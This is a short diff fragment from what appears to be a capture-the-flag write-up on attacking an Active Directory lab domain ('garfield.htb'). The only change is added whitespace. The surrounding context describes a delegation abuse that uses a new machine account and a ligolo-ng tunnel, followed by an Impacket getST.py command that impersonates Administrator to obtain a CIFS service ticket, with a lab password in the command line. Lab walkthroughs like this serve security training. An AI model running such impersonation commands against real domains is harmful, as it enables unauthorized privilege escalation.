@@ -352,6 +352,8 @@ Then ill use the new machine account and setuip the delegation
 
 But in order to request the service ticket i need to be able to reach the machine, for this ill have to setup ligolo-ng 
 
+
+
 ```python
 ❯❯❯ getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate "Administrator" -dc-ip "$DC_IP" 'garfield.htb/l.wilson_adm:Password123!'
 ```
